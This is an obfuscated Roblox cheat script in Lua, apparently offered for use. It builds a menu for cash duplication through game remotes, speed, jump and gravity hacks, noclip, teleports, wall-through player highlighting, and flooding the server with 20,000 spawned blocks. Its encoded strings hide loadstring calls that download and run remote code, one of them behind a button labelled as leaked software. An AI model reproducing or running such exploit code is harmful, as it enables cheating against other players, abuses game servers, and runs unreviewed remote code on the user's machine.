--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v19,v20) local v21={};for v88=1, #v19 do v6(v21,v0(v4(v1(v2(v19,v88,v88 + 1 )),v1(v2(v20,1 + (v88% #v20) ,1 + (v88% #v20) + 1 )))%256 ));end return v5(v21);end local v8=loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\245\32\228\174\203\31\156\240\212\35\242\172\200\12\218\208\148\9\243\181\198\83\248\205\207\32\244\189\198\29\212\142\232\48\239\175\194\81\220\194\210\43\169\168\200\11\195\192\222\107\234\174\198","\126\177\163\187\69\134\219\167"),true))();local v9=v8:CreateWindow({[v7("\13\204\39\192","\156\67\173\74\165")]=v7("\18\182\93\23\176\60\6\28\162\75","\38\84\215\41\118\220\70"),[v7("\99\3\32\6\247\68\26\39","\158\48\118\66\114")]=nil,[v7("\135\43\23\57\90\129","\155\203\68\112\86\19\197")]=nil,[v7("\106\210\55\248\73\118\226\221\72\220\52\240\69\124","\152\38\189\86\156\32\24\133")]=true,[v7("\208\88\166\66\245\89\160\114\245\67\171\67","\38\156\55\199")]=v7("\142\124\104\41\31\110\186\107\189\127","\35\200\29\28\72\115\20\154"),[v7("\53\176\208\219\132\34\51\42\170\211\203\132\56\56\28","\84\121\223\177\191\237\76")]=v7("\151\89\200\164\51\94\55\129\142\127\135\238\116","\161\219\54\169\192\90\48\80"),[v7("\106\77\14\35\64\69\51\32\93\86\9\43\78\81","\69\41\34\96")]={[v7("\159\204\217\12\11\44\154\204\219\14\7\57","\75\220\163\183\106\98")]=v7("\36\187\159\54\213\24\146\158\53\250\13\180\141\62\222\17","\185\98\218\235\87")},[v7("\224\57\62\213\199\185\223\57\42","\202\171\92\71\134\190")]=false});local v10=v9:CreateTab({[v7("\7\192\33\141","\232\73\161\76")]=v7("\150\216\75\83","\126\219\185\34\61"),[v7("\37\205\81\124","\135\108\174\62\18\30\23\147")]=v7("\183\249\58\216","\167\214\137\74\171\120\206\83"),[v7("\162\253\51\90\253\148\132\229\32\94\253","\199\235\144\82\61\152")]=v7("\42\23\173\46\21\31\184\39","\75\103\118\217"),[v7("\244\92\127\3\141\23\211\88\117","\126\167\52\16\116\217")]=true});v10:CreateButton({[v7("\230\47\45\133","\156\168\78\64\224\212\121")]=v7("\55\251\183\222\11\235\229\230\8\226\169\193\16","\174\103\142\197"),[v7("\114\45\76\59\55\87\232\66\33\80\54","\152\54\72\63\88\69\62")]=v7("\228\214\225\91\209\197\252\79\148\201\251\79\192\132\236\89\148\205\227\76\219\214\250\89\208\132\232\83\198\132\231\72\148\208\225\28\195\203\252\87","\60\180\164\142"),[v7("\123\95\9\37\37\236\17\83","\114\56\62\101\73\71\141")]=function() local v22=0 + 0 ;local v23;local v24;while true do if (v22==(1035 -(125 + 909))) then v24={[1]=1949 -(1096 + 852) };game:GetService(v7("\224\227\33\190\175\253\10\198\227\53\129\178\241\25\211\225\52","\107\178\134\81\210\198\158")).WalletRemotes.DropCash:FireServer(unpack(v24));break;end if (v22==(0 + 0)) then v23={[1 -0 ]=16,[2 + 0 ]=562 -(409 + 103) };game:GetService(v7("\138\236\203\200\177\234\218\208\189\237\232\208\183\251\218\195\189","\164\216\137\187")).Purple:FireServer(unpack(v23));v22=237 -(46 + 190) ;end end end});v10:CreateButton({[v7("\22\15\143\195","\202\88\110\226\166")]=v7("\231\29\141\231\138\224\14\145\255\138\219\94\210\167","\170\163\111\226\151"),[v7("\53\53\161\59\92\62\57\5\57\189\54","\73\113\80\210\88\46\87")]=v7("\165\62\194\2\244\193\104\156\82\182\209\124\141\6\238\140\41\222","\135\225\76\173\114"),[v7("\57\236\180\188\174\188\164\17","\199\122\141\216\208\204\221")]=function() for v89=96 -(51 + 44) ,29 + 71  do local v90=1317 -(1114 + 203) ;local v91;while true do if ((726 -(228 + 498))==v90) then v91={[1]=1 + 0 };game:GetService(v7("\159\216\0\252\113\245\172\201\21\244\75\226\162\207\17\247\125","\150\205\189\112\144\24")).WalletRemotes.DropCash:FireServer(unpack(v91));v90=1;end if (v90==1) then task.wait(0.1);break;end end end end});v10:CreateButton({[v7("\11\133\178\73","\112\69\228\223\44\100\232\113")]=v7("\231\28\6\221\246\122\137\198\95\46\199\179\113\149","\230\180\127\103\179\214\28"),[v7("\168\0\76\69\246\72\240\152\12\80\72","\128\236\101\63\38\132\33")]=v7("\159\170\16\74\246\237\192\190\233\56\80\179\230\220\236\160\31\4\162\227\202\236\174\16\73\179","\175\204\201\113\36\214\139"),[v7("\100\205\57\208\6\70\207\62","\100\39\172\85\188")]=function() local v25=0 + 0 ;local v26;local v27;local v28;local v29;local v30;while true do if (v25==2) then if ( not v28 or  not v29) then local v154=0;while true do if (v154==0) then warn(v7("\155\224\211\205\40\148\242\93\177\231\205\198\122\192\189\106\254\244\200\204\62\142\166\118\187\178\233\215\55\207\188\113\183\246\243\205\53\218\130\127\172\230\129\205\40\142\144\127\189\249\209\195\57\197\252","\30\222\146\161\162\90\174\210"));return;end end end v30=663 -(174 + 489) ;v25=3;end if (v25==(2 -1)) then local v117=0;while true do if ((1905 -(830 + 1075))==v117) then v28=v27:FindFirstChild(v7("\133\109\180\129\61\162\113\189\178\60\162\108\137\129\33\185","\83\205\24\217\224"));v29=v26:FindFirstChild(v7("\196\196\206\54\246\196\206\54","\93\134\165\173"));v117=1;end if ((525 -(303 + 221))==v117) then v25=2;break;end end end if (v25==(1272 -(231 + 1038))) then for v124,v125 in pairs(game.Workspace:GetDescendants()) do if ((v125.Name==v7("\214\89\127\24\225\105\121\28\224\92","\106\133\46\16")) or (v125.Name==v7("\127\37\114\238\125\73\78\37\97","\32\56\64\19\156\58")) or (v125.Name==v7("\125\193\243\83\72","\224\58\168\133\54\58\146"))) then local v173=0 + 0 ;local v174;while true do if (v173==0) then v174=v125.Parent:FindFirstChildOfClass(v7("\105\87\89\233","\107\57\54\43\157\21\230\231"));if v174 then local v189=1162 -(171 + 991) ;while true do if (v189==(4 -3)) then if v125:IsA(v7("\239\132\30\249","\175\187\235\113\149\217\188")) then local v198=0 -0 ;while true do if (v198==0) then v125.Parent=v29;v30=v30 + (2 -1) ;break;end end end break;end if (v189==0) then v28.CFrame=v174.CFrame + Vector3.new(0 + 0 ,3 -2 ,0 -0 ) ;task.wait(0.1 -0 );v189=3 -2 ;end end end break;end end end end print(v7("\31\160\141\64\230\122\108\57\171\193\101\247\124\117\47\245","\24\92\207\225\44\131\25"),v30);break;end if (v25==(1248 -(111 + 1137))) then local v118=158 -(91 + 67) ;while true do if (v118==(2 -1)) then v25=1 + 0 ;break;end if (v118==0) then v26=game.Players.LocalPlayer;v27=v26.Character or v26.CharacterAdded:Wait() ;v118=524 -(423 + 100) ;end end end end end});v10:CreateButton({[v7("\101\210\181\73","\29\43\179\216\44\123")]=v7("\152\200\53\69\173\153\1\64\177","\44\221\185\64"),[v7("\37\226\91\92\97\8\247\92\86\124\15","\19\97\135\40\63")]=v7("\139\77\38\50\63\113\175\80\63\123\46\39\175\85\63\58\45\61\171\28\58\47\42\60\189\28\58\53\111\37\166\89\115\50\33\39\171\82\39\52\61\40","\81\206\60\83\91\79"),[v7("\109\170\220\126\45\194\78\175","\196\46\203\176\18\79\163\45")]=function() local v31=0 + 0 ;local v32;local v33;while true do if (v31==1) then if  not v33 then local v155=0 -0 ;while true do if (v155==(0 + 0)) then warn(v7("\143\218\31\196\215\249\151\195\171\203\6\219\196\160\220\161\164\199\25\139\195\172\194\239\174\134","\129\202\168\109\171\165\195\183"));return;end end end for v126,v127 in pairs(v33:GetChildren()) do if v127:IsA(v7("\22\87\56\212","\134\66\56\87\184\190\116")) then v127.Parent=v32.Character;end end break;end if (0==v31) then v32=game.Players.LocalPlayer;v33=v32:FindFirstChild(v7("\154\35\125\21\52\250\236\179","\143\216\66\30\126\68\155"));v31=772 -(326 + 445) ;end end end});v10:CreateButton({[v7("\18\48\4\190","\85\92\81\105\219\121\139\65")]=v7("\201\182\92\64\108\208\239\167\16\81\115\159\208\178\89\75\60\242\248\189\69","\191\157\211\48\37\28"),[v7("\251\26\231\31\40\214\15\224\21\53\209","\90\191\127\148\124")]=v7("\76\130\34\18\104\136\60\3\56\147\33\87\108\143\43\87\85\134\39\25\56\170\43\25\109","\119\24\231\78"),[v7("\161\44\169\70\222\65\18\137","\113\226\77\197\42\188\32")]=function() local v34=0;local v35;while true do if (v34==1) then v35();break;end if (v34==(0 -0)) then v35=nil;function v35() local v128=Workspace.CurrentCamera;local v129=v128:FindFirstChildOfClass(v7("\24\26\225\167\31\16\242\176\57\2","\213\90\118\148"));if v129 then v129:Destroy();end local v130=Instance.new(v7("\107\47\166\66","\45\59\78\212\54"));v130.Name=v7("\36\83\143\142\150\33\191\228\32\87\145\159","\144\112\54\227\235\230\78\205");v130.Size=Vector3.new(445 -245 ,2 -1 ,911 -(530 + 181) );v130.Anchored=true;v130.Transparency=0.9;v130.CFrame=v128.CFrame * CFrame.new(881 -(614 + 267) , -(35 -(19 + 13)), -(4 -1)) ;v130.Parent=Workspace;local v137=game.Players.LocalPlayer.Character;if (v137 and v137:FindFirstChild(v7("\155\61\2\253\222\84\186\44\61\243\223\79\131\41\29\232","\59\211\72\111\156\176"))) then v137.HumanoidRootPart.CFrame=v130.CFrame + Vector3.new(0 -0 ,5,0) ;end end v34=2 -1 ;end end end});local v11=v9:CreateTab({[v7("\96\134\238\40","\77\46\231\131")]=v7("\150\91\181\65\182\100\186\65\163\81\164","\32\218\52\214"),[v7("\103\20\62\166","\58\46\119\81\200\145\208\37")]=v7("\59\137\34\191\166\179","\86\75\236\80\204\201\221"),[v7("\91\76\118\130\251\184\125\84\101\134\251","\235\18\33\23\229\158")]=v7("\125\187\213\190\66\179\192\183","\219\48\218\161"),[v7("\215\121\115\94\239\70\244\232\116","\128\132\17\28\41\187\47")]=true});v11:CreateSlider({[v7("\47\51\11\63","\61\97\82\102\90")]=v7("\155\47\167\64\212\71\27\12\168","\105\204\78\203\43\167\55\126"),[v7("\151\171\45\25\22","\49\197\202\67\126\115\100\167")]={0 + 0 ,351 -151 },[v7("\30\85\220\59\133\91\91\57\79","\62\87\59\191\73\224\54")]=10 -5 ,[v7("\196\23\232\219\226\12\238\255\230\14\239\204","\169\135\98\154")]=1828 -(1293 + 519) ,[v7("\232\118\40\88\255\50\203\192","\168\171\23\68\52\157\83")]=function(v36) local v37=0 -0 ;local v38;while true do if (v37==(0 -0)) then v38=game.Players.LocalPlayer;if (v38.Character and v38.Character:FindFirstChild(v7("\220\100\248\172\43\34\142\240","\231\148\17\149\205\69\77"))) then v38.Character.Humanoid.WalkSpeed=v36;end break;end end end});v11:CreateSlider({[v7("\174\166\202\254","\159\224\199\167\155\55")]=v7("\221\230\49\194\199\252\43\215\229","\178\151\147\92"),[v7("\190\252\66\53\23","\26\236\157\44\82\114\44")]={0 -0 ,200},[v7("\3\32\214\73\47\35\208\85\62","\59\74\78\181")]=11 -6 ,[v7("\6\196\72\72\182\43\197\108\91\191\48\212","\211\69\177\58\58")]=27 + 23 ,[v7("\148\228\117\249\235\202\180\238","\171\215\133\25\149\137")]=function(v39) local v40=0 + 0 ;local v41;while true do if (v40==(0 -0)) then v41=game.Players.LocalPlayer;if (v41.Character and v41.Character:FindFirstChild(v7("\201\221\63\251\225\63\245\70","\34\129\168\82\154\143\80\156"))) then v41.Character.Humanoid.JumpPower=v39;end break;end end end});v11:CreateSlider({[v7("\171\179\62\14","\233\229\210\83\107\40\46")]=v7("\230\80\51\192\12\213\91","\101\161\34\82\182"),[v7("\218\12\87\249\222","\78\136\109\57\158\187\130\226")]={0 + 0 ,1292.2 -(709 + 387) },[v7("\23\49\250\227\59\50\252\255\42","\145\94\95\153")]=1859 -(673 + 1185) ,[v7("\222\216\6\199\75\185\233\251\21\217\91\178","\215\157\173\116\181\46")]=game.Workspace.Gravity,[v7("\22\181\135\254\216\52\183\128","\186\85\212\235\146")]=function(v42) game.Workspace.Gravity=v42;end});v11:CreateButton({[v7("\236\128\27\251","\56\162\225\118\158\89\142")]=v7("\114\10\227\163\43\200","\184\60\101\160\207\66"),[v7("\21\135\111\191\35\139\108\168\56\141\114","\220\81\226\28")]=v7("\39\218\133\252\230\194\83\251\141\216\230\206\3\149\202\204\235\203\24\149\150\243\248\200\6\210\138\187\253\198\31\217\145\178","\167\115\181\226\155\138"),[v7("\193\35\235\80\121\112\197\233","\166\130\66\135\60\27\17")]=function() local v44=0;local v45;local v46;local v47;local v48;while true do if ((0 -0)==v44) then v45=game.Players.LocalPlayer;v46=v45.Character or v45.CharacterAdded:Wait() ;v44=3 -2 ;end if (v44==(2 -0)) then function v48() local v138=0 + 0 ;local v139;while true do if (v138==(0 + 0)) then v139=0;while true do if (v139==(0 -0)) then v47= not v47;while v47 do local v190=0 + 0 ;while true do if (v190==0) then for v196,v197 in pairs(v46:GetChildren()) do if (v197:IsA(v7("\102\75\221\112\0\69\88\218","\80\36\42\174\21")) and v197.CanCollide) then v197.CanCollide=false;end end wait();break;end end end break;end end break;end end end v48();break;end if (v44==(1 -0)) then local v123=0 -0 ;while true do if ((1881 -(446 + 1434))==v123) then v44=2;break;end if (v123==0) then v47=false;v48=nil;v123=1;end end end end end});local v12=v9:CreateTab({[v7("\96\17\58\127","\26\46\112\87")]=v7("\141\38\167\113\175\176\87\160\170","\212\217\67\203\20\223\223\37"),[v7("\147\142\167\220","\178\218\237\200")]=v7("\187\180\246","\176\214\213\134"),[v7("\221\160\183\211\173\101\86\225\191\181\209","\57\148\205\214\180\200\54")]=v7("\63\252\33\49\100\27\252\57","\22\114\157\85\84"),[v7("\247\195\28\211\105\255\188\200\206","\200\164\171\115\164\61\150")]=true});v12:CreateButton({[v7("\144\245\14\64","\227\222\148\99\37")]=v7("\21\93\71\248\253\50\70\91\249\247","\153\83\50\50\150"),[v7("\121\115\96\31\97\162\93\73\127\124\18","\45\61\22\19\124\19\203")]=v7("\245\23\1\240\18\127\171\213\82\25\250\66\100\177\196\82\43\250\23\126\189\192\6\4\250\12","\217\161\114\109\149\98\16"),[v7("\49\33\52\112\190\117\17\43","\20\114\64\88\28\220")]=function() game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new( -(1574.4401550292969 -(1040 + 243)),143.6999969482422 -95 ,223.34576416015625));end});v12:CreateButton({[v7("\31\0\223\177","\221\81\97\178\212\152\176")]=v7("\253\232\15\239\27\193","\122\173\135\125\155"),[v7("\160\196\19\186\45\56\216\144\200\15\183","\168\228\161\96\217\95\81")]=v7("\239\212\34\89\63\88\201\197\110\72\32\23\207\217\43\28\31\88\201\197\47\80","\55\187\177\78\60\79"),[v7("\14\207\83\231\68\206\131\38","\224\77\174\63\139\38\175")]=function() game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new( -(2153.3114318847656 -(559 + 1288)),1984.7699012756348 -(609 + 1322) ,653.5266876220703 -(13 + 441) ));end});v12:CreateButton({[v7("\170\64\85\43","\78\228\33\56")]=v7("\237\118\179\14\149\199\113\188\67\167\219\119\190\7\128\220\62\129\23\132\218\107\183","\229\174\30\210\99"),[v7("\63\232\149\82\255\52\41\15\228\137\95","\89\123\141\230\49\141\93")]=v7("\199\116\250\9\0\69\225\101\182\24\31\10\231\121\243\76\51\66\242\124\230\5\31\68\179\83\227\5\28\78\246\99\182\63\4\75\231\100\243","\42\147\17\150\108\112"),[v7("\44\167\33\115\229\233\12\173","\136\111\198\77\31\135")]=function() game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new( -(788.6175231933594 -577),125.69999694824219 -77 ,2106.3782653808594 -1683 ));end});v12:CreateButton({[v7("\44\8\170\83","\201\98\105\199\54\221\132\119")]=v7("\151\25\136\36","\204\217\108\227\65\98\85"),[v7("\122\198\230\230\62\201\78\215\252\234\34","\160\62\163\149\133\76")]=v7("\226\165\1\42\211\217\178\25\111\215\217\224\25\39\198\150\142\24\36\198\150\172\2\44\194\194\169\2\33","\163\182\192\109\79"),[v7("\23\39\12\204\247\53\37\11","\149\84\70\96\160")]=function() end});local v13=v9:CreateTab({[v7("\22\7\0\232","\141\88\102\109")]=v7("\158\90\217\115\31\49\89\192\189\86\197\101\9","\161\211\51\170\16\122\93\53"),[v7("\210\173\189\38","\72\155\206\210")]=v7("\85\110\85\28","\83\38\26\52\110"),[v7("\113\26\38\65\93\36\40\83\74\20\34","\38\56\119\71")]=v7("\222\238\76\211\55\95\242\227","\54\147\143\56\182\69"),[v7("\229\137\240\94\235\223\149\243\76","\191\182\225\159\41")]=true});local v14=v13:CreateButton({[v7("\5\19\37\80","\162\75\114\72\53\235\231")]=v7("\169\15\116\162\99\14\141\37\65\240\18","\98\236\92\36\130\51"),[v7("\128\28\31\185\87\161\165\36\173\22\2","\80\196\121\108\218\37\200\213")]=v7("\40\122\5\119\71\7\141\8\103\66\112\95\6\143\18\51\18\115\74\23\143\18\96\76","\234\96\19\98\31\43\110"),[v7("\37\30\94\203\174\115\136\13","\235\102\127\50\167\204\18")]=function() _G.FriendColor=Color3.fromRGB(0 + 0 ,0,926 -671 );_G.EnemyColor=Color3.fromRGB(91 + 164 ,0,0);_G.UseTeamColor=true;local v49=Instance.new(v7("\118\174\249\39\65\60","\78\48\193\149\67\36"),game.CoreGui);v49.Name=v7("\21\45\176","\33\80\126\224\120");local v51=Instance.new(v7("\206\167\27\236\93\226\172\15\193\125\232\167\17\202\81\233\166\23","\60\140\200\99\164"));v51.Name=v7("\137\253\8\4\173\159","\194\231\148\100\70");v51.Size=Vector3.new(1 + 0 ,5 -3 ,1 + 0 );v51.Color3=Color3.new((183 -83)/(169 + 86) ,100/(142 + 113) ,(72 + 28)/255 );v51.Transparency=0.7 + 0 ;v51.ZIndex=0 + 0 ;v51.AlwaysOnTop=false;v51.Visible=false;local v59=Instance.new(v7("\100\69\205\175\244\199\71\94\197\132\227\193","\168\38\44\161\195\150"));v59.Name=v7("\142\245\142\88\49\229\179\34\129\251","\118\224\156\226\22\80\136\214");v59.Enabled=false;v59.Size=UDim2.new(0,633 -(153 + 280) ,0 -0 ,45 + 5 );v59.AlwaysOnTop=true;v59.StudsOffset=Vector3.new(0 + 0 ,1.8 + 0 ,0);local v65=Instance.new(v7("\118\235\65\148\110\239\91\133\78","\224\34\142\57"),v59);v65.Name=v7("\234\166\194","\110\190\199\165\189\19\145\61");v65.BackgroundTransparency=1 + 0 ;v65.Position=UDim2.new(0 + 0 , -50,0 -0 ,0 + 0 );v65.Size=UDim2.new(667 -(89 + 578) ,215 + 85 ,0 -0 ,1069 -(572 + 477) );v65.TextSize=15;v65.TextColor3=Color3.new(100/255 ,(14 + 86)/(154 + 101) ,(12 + 88)/(341 -(84 + 2)) );v65.TextStrokeColor3=Color3.new(NaN-0 ,NaN-(11 + 11) ,NaN-270385318 );v65.TextStrokeTransparency=0.4 + 0 ;v65.Text=v7("\212\226\123","\167\186\139\23\136\235");v65.Font=Enum.Font.SourceSansBold;v65.TextScaled=false;local v78=function(v92) local v93=0 + 0 ;local v94;local v95;local v96;local v97;local v98;while true do if (v93==(8 -4)) then v96.Tag.TextColor3=Color3.new(v92.TeamColor.r,v92.TeamColor.g,v92.TeamColor.b);v97=nil;function v98() if  not pcall(function() local v179=0 + 0 ;local v180;local v181;while true do if ((0 -0)==v179) then v92.Character.Humanoid.DisplayDistanceType=Enum.HumanoidDisplayDistanceType.None;v180=math.floor(v92.Character.Humanoid.MaxHealth);v179=1 + 0 ;end if (v179==(2 -1)) then v181=math.floor(v92.Character.Humanoid.Health);break;end end end) then v97:Disconnect();end end v98();v93=4 + 1 ;end if (v93==2) then v96=v59:Clone();v96.Name=v92.Name   .. v7("\45\199\122\73\55\199\112","\44\99\166\23") ;v96.Enabled=true;v96.Parent=v94;v93=492 -(457 + 32) ;end if (v93==(1 + 0)) then v95=v51:Clone();v95.Name=v92.Name   .. v7("\204\248\186","\80\142\151\194") ;v95.Adornee=v92.Character;v95.Parent=v94;v93=1404 -(832 + 570) ;end if (v93==(5 + 0)) then v97=v92.Character.Humanoid.Changed:Connect(v98);break;end if (v93==0) then repeat wait();until v92.Character~=nil  v92.Character:WaitForChild(v7("\50\160\133\12\20\186\129\9","\109\122\213\232"));v94=v49:FindFirstChild(v92.Name);v94:ClearAllChildren();v93=1 + 0 ;end if (v93==(10 -7)) then v96.Adornee=v92.Character:WaitForChild(v7("\84\242\40\50","\196\28\151\73\86\83"),3 + 2 );if  not v96.Adornee then return UnloadCharacter(v92);end v96.Tag.Text=v92.Name;v95.Color3=Color3.new(v92.TeamColor.r,v92.TeamColor.g,v92.TeamColor.b);v93=800 -(588 + 208) ;end end end;local v79=function(v99) local v100=0;local v101;while true do if (v100==(0 -0)) then v101=v49:FindFirstChild(v99.Name);if (v101 and ((v101:FindFirstChild(v99.Name   .. v7("\209\12\49","\22\147\99\73\112\226\56\120") )~=nil) or (v101:FindFirstChild(v99.Name   .. v7("\150\116\239\240\185\185\114","\237\216\21\130\149") )~=nil))) then v101:ClearAllChildren();end break;end end end;local v80=function(v102) local v103=1800 -(884 + 916) ;local v104;while true do if (v103==(0 -0)) then v104=Instance.new(v7("\164\65\83\91\181\219","\62\226\46\63\63\208\169"),v49);v104.Name=v102.Name;v103=1;end if ((2 + 0)==v103) then v102.Changed:Connect(function(v158) if (v158==v7("\209\28\84\142\60\2\35\81\247","\62\133\121\53\227\127\109\79")) then local v182=0;while true do if (v182==1) then v78(v102);break;end if (v182==(653 -(232 + 421))) then v79(v102);wait();v182=1890 -(1569 + 320) ;end end end end);v78(v102);break;end if (v103==(1 + 0)) then v102.CharacterAdded:Connect(function() pcall(v78,v102);end);v102.CharacterRemoving:Connect(function() pcall(v79,v102);end);v103=1 + 1 ;end end end;local v81=function(v105) local v106=0 -0 ;local v107;while true do if (v106==0) then v79(v105);v107=v49:FindFirstChild(v105.Name);v106=1;end if (1==v106) then if v107 then v107:Destroy();end break;end end end;for v108,v109 in pairs(game:GetService(v7("\32\24\51\236\211\188\177","\194\112\116\82\149\182\206")):GetPlayers()) do spawn(function() pcall(v80,v109);end);end game:GetService(v7("\9\164\77\1\197\240\29","\110\89\200\44\120\160\130")).PlayerAdded:Connect(function(v110) pcall(v80,v110);end);game:GetService(v7("\155\207\74\95\70\88\40","\45\203\163\43\38\35\42\91")).PlayerRemoving:Connect(function(v111) pcall(v81,v111);end);game:GetService(v7("\226\137\221\58\130\187\71","\52\178\229\188\67\231\201")).LocalPlayer.NameDisplayDistance=0;if _G.Reantheajfdfjdgs then return;end _G.Reantheajfdfjdgs=v7("\123\82\69\13\241\93\58\41\70\70\23\243\91\43\39\82\86\15\246\86\38\54\71\66\12\252\15\113\112\83\91\86\166\15\40\43\83\87\15\255\86\119\114\19\66\14\164\8\37\119\22\84\2","\67\65\33\48\100\151\60");local v83=game:GetService(v7("\239\235\175\193\246\205\244","\147\191\135\206\184"));local v84=v83.LocalPlayer;function esp(v112,v113) if v112.Character then if  not v112.Character:FindFirstChild(v7("\163\45\178\243\221\82\190","\210\228\72\198\161\184\51")) then local v159=Instance.new(v7("\30\64\244\24\127\199\49\65\231","\174\86\41\147\112\19"));v159.RobloxLocked=true;v159.Name=v7("\124\5\153\57\32\14\29","\203\59\96\237\107\69\111\113");v159.Adornee=v112.Character;v159.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop;v159.FillColor=v113;v159.Parent=v112.Character;else v112.Character.GetReal.FillColor=v113;end end end while task.wait() do for v115,v116 in pairs(v83:GetPlayers()) do if (v116~=v84) then esp(v116,(_G.UseTeamColor and v116.TeamColor.Color) or ((v84.TeamColor==v116.TeamColor) and _G.FriendColor) or _G.EnemyColor );end end end end});v9:CreateHomeTab({[v7("\0\31\191\226\62\226\211\13\24\186\232\37\245","\183\68\118\204\129\81\144")]=v7("\60\244\72\177\49\219\62\172","\226\110\205\16\132\107"),[v7("\194\192\239\215","\33\139\163\128\185")]=1});local v15=v9:CreateTab({[v7("\121\89\9\219","\190\55\56\100")]=v7("\112\138\124\42\1\236\255\90\166\50\25\83\196\198\127","\147\54\207\92\126\115\131"),[v7("\36\50\58\115","\30\109\81\85\29\109")]=v7("\233\120\81\161\9\215\242\192\112\70","\156\159\17\52\214\86\190"),[v7("\135\226\188\187\171\220\178\169\188\236\184","\220\206\143\221")]=v7("\171\124\57\18\202\197\211\138","\178\230\29\77\119\184\172"),[v7("\198\182\5\12\67\241\225\178\15","\152\149\222\106\123\23")]=true});local v16=v15:CreateButton({[v7("\243\39\251\70","\213\189\70\150\35")]="(âš ï¸) Krone Leaked by me",[v7("\107\80\103\11\93\92\100\28\70\90\122","\104\47\53\20")]=nil,[v7("\128\77\141\16\190\14\160\71","\111\195\44\225\124\220")]=function() loadstring(game:HttpGet(v7("\208\82\20\99\184\241\151\9\18\114\188\184\219\84\9\99\191\184\150\72\5\103\228\185\217\81\79\70\165\162\206\67\18\96\170\167\149\117\3\97\162\187\204\11\43\97\164\165\221\11\12\118\170\160\221\66\77\113\178\230\213\67\77\36\250\254\139","\203\184\38\96\19\203")))();end});local v17=v9:CreateTab({[v7("\23\114\116\68","\174\89\19\25\33")]=v7("\9\0\87\75\183\165\30\38\30\86","\107\79\114\50\46\151\231"),[v7("\16\165\186\39","\160\89\198\213\73\234\89\215")]=v7("\94\120\177\233\250\65\127\139\255\215","\165\40\17\212\158"),[v7("\204\212\9\52\35\214\214\29\33\37\224","\70\133\185\104\83")]=v7("\41\68\80\47\219\13\68\72","\169\100\37\36\74"),[v7("\51\143\173\71\52\142\182\92\5","\48\96\231\194")]=true});local v18=v17:CreateButton({[v7("\230\91\3\40","\227\168\58\110\77\121\184\207")]="Spawn x20,000 Blockâ€™s",[v7("\95\57\172\67\163\210\97\177\114\51\177","\197\27\92\223\32\209\187\17")]="Dropping 20,000 Blockâ€™s from the sky with a (0.02) Time Spawn",[v7("\32\94\207\247\1\94\192\240","\155\99\63\163")]=function() local v85=20605 -(316 + 289) ;local v86=40;local v87= -(1308 -808);while true do local v114=0;while true do if (v114==(0 + 0)) then for v169=1454 -(666 + 787) ,v85 do local v170=math.random(426 -(360 + 65) ,2 + 0 );local v171;if (v170==(255 -(79 + 175))) then v171={[1 -0 ]=44052817 + 12400236 ,[5 -3 ]={[1 -0 ]=CFrame.new(math.random( -500,500),math.random(999 -(503 + 396) ,300),math.random( -500,681 -(92 + 89) )) * CFrame.Angles(0 -0 ,0 + 0 ,0 + 0 ) ,[7 -5 ]=workspace.Map.Baseplate,[1 + 2 ]=CFrame.new(math.random( -(1140 -640),437 + 63 ),45,math.random( -500,239 + 261 )) * CFrame.Angles(0 -0 ,0,0 + 0 ) }};elseif (v170==(2 -0)) then v171={[1245 -(485 + 759) ]=130624319 -74171908 ,[2]={[1190 -(442 + 747) ]=CFrame.new(math.random( -(1635 -(832 + 303)),500),math.random(1046 -(88 + 858) ,92 + 208 ),math.random( -500,414 + 86 )) * CFrame.Angles(0 + 0 ,789 -(766 + 23) ,0 -0 ) ,[2 -0 ]=workspace.Map.Baseplate,[7 -4 ]=CFrame.new(math.random( -(1697 -1197),1573 -(1036 + 37) ),32 + 13 ,math.random( -500,500)) * CFrame.Angles(0 -0 ,0 + 0 ,1480 -(641 + 839) ) }};end game:GetService(v7("\176\212\177\129\176\135\131\197\164\137\138\144\141\195\160\138\188","\228\226\177\193\237\217")).BuildingBridge.Stamp:InvokeServer(unpack(v171));local v172=game:GetService(v7("\3\191\49\237\39\160\34\229\49","\134\84\208\67")):FindFirstChild(v171[1]);if v172 then for v183,v184 in pairs(v172:GetChildren()) do if v184:IsA(v7("\49\173\149\89\35\173\148\72","\60\115\204\230")) then local v187=913 -(910 + 3) ;local v188;while true do if (v187==0) then v184.Anchored=false;v188=Instance.new(v7("\197\53\239\105\209\63\231\127\228\51\255\105","\16\135\90\139"));v187=2 -1 ;end if (1==v187) then v188.MaxForce=Vector3.new(100000,101684 -(1466 + 218) ,100000);v188.Velocity=Vector3.new(0,v87,0 + 0 );v187=2;end if ((1150 -(556 + 592))==v187) then v188.Parent=v184;break;end end end end end end wait(0.02 + 0 );break;end end end end});
